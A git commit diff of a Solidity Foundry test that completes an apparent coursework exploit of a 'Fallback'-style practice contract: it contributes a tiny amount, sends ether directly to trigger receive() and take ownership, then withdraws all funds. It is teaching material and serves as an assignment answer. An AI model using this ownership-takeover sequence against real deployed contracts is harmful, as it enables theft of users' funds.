f7879cf3d7da93fcb5da26b32ac9188fa66c3658
Raef-Hany <98807473+Raef-Hany@users.noreply.github.com>
2025-05-05 11:09:24 +0300

    Complete Assignment 11 exploit

--- test/Assignment11.sol
+++ test/Assignment11.sol
@@ -18,11 +18,15 @@ contract FallbackTest is Test {
         vm.startPrank(student);
         
         // Contribute a small amount (less than 0.001 ether) to the contract
+        fallbackContract.contribute{value: 0.0001 ether}();
 
         // Send ether to the contract trigger receive() and become the owner
-
+        (bool sucess, ) = address(fallbackContract).call{value: 0.001 ether}("");
+        require(sucess, "Failed to send ether to contract");
+        
         // Withdraw all funds
-
+        fallbackContract.withdraw();
+        
         vm.stopPrank();
     }
 
